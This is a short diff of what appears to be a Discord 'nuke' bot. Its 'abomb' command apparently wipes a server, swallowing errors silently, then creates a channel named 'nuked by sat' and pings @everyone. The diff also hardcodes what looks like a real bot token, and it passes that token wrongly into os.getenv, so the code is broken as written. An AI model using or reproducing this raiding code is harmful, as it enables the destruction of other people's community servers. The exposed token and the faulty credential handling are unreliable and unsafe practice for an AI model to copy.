@@ -21,8 +21,8 @@ async def abomb(ctx):
         except:
             pass
 
-    await ctx.guild.create_text_channel('nuked')
-    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
+    await ctx.guild.create_text_channel('nuked by sat')
+    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked by sat')
     await channel.send("@everyone\nKABOOOM\n")
 
   else:
@@ -107,5 +107,5 @@ async def e(ctx):
     await ctx.send("No")
 
 
-client.run(os.getenv('TOKEN'))
+client.run(os.getenv('ODU1MDkxOTgwNzQzOTk5NTIx.YMtcdw.NDeIXQQjSLgXnGUm__70iau0358'))
 
